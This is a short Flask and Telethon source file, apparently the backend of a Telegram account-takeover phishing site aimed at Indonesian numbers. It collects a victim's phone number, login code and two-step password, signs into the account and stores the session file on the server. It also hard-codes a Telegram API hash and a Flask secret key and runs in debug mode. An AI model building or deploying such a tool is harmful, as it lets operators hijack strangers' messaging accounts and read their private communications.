from flask import Flask, request, render_template, redirect, url_for, session, flash, make_response
from telethon import TelegramClient, errors
import asyncio

api_id = 29997622
api_hash = '3e3586f0e43eada49d530bce9549213f'

app = Flask(__name__)
app.secret_key = 'supersecretkey'

client_dict = {}
phone_code_hash_dict = {}


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        phone_number = "62" + request.form['phone_number']
        session['phone_number'] = phone_number
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(send_otp(phone_number))
        return redirect(url_for('confirm_otp'))
    return render_template('index.html')


@app.route('/confirm_otp', methods=['GET', 'POST'])
def confirm_otp():
    phone_number = session.get('phone_number')
    if request.method == 'POST':
        otp = request.form['otp']
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(confirm_otp_async(phone_number, otp))
            response = make_response(render_template('success.html'))
            return response
        except errors.SessionPasswordNeededError:
            return handle_password_needed(phone_number)
        except Exception as e:
            flash(f"Error saat mengkonfirmasi OTP: {str(e)}")
            return redirect(url_for('confirm_otp'))
    return render_template('confirm_otp.html', phone_number=phone_number)


@app.route('/enter_password', methods=['GET', 'POST'])
def enter_password():
    if request.method == 'POST':
        password = request.form['password']
        session['password'] = password
        return redirect(url_for('confirm_otp'))
    return render_template('enter_password.html')


async def send_otp(phone_number):
    client = TelegramClient(f'session_{phone_number}', api_id, api_hash)
    await client.connect()
    client_dict[phone_number] = client
    while True:
        try:
            response = await client.send_code_request(phone_number)
            phone_code_hash_dict[phone_number] = response.phone_code_hash
            break
        except errors.AuthRestartError:
            continue
        except Exception as e:
            print(f"Error saat mengirim OTP: {e}")
            await client.disconnect()
            return
    await client.disconnect()


async def confirm_otp_async(phone_number, otp):
    client = TelegramClient(f'session_{phone_number}', api_id, api_hash)
    await client.connect()
    try:
        phone_code_hash = phone_code_hash_dict.get(phone_number)
        if phone_code_hash:
            await client.sign_in(phone_number, code=otp, phone_code_hash=phone_code_hash)

            if await client.is_user_authorized():
                await client.start(phone_number)
                print(f"Sesi disimpan untuk nomor {phone_number}")
            else:
                raise errors.SessionPasswordNeededError()

    except errors.SessionPasswordNeededError:
        return handle_password_needed(phone_number)
    except Exception as e:
        print(f"Error saat mengkonfirmasi OTP: {e}")
    finally:
        await client.disconnect()


def handle_password_needed(phone_number):
    return redirect(url_for('enter_password'))


if __name__ == '__main__':
    app.run(debug=True)
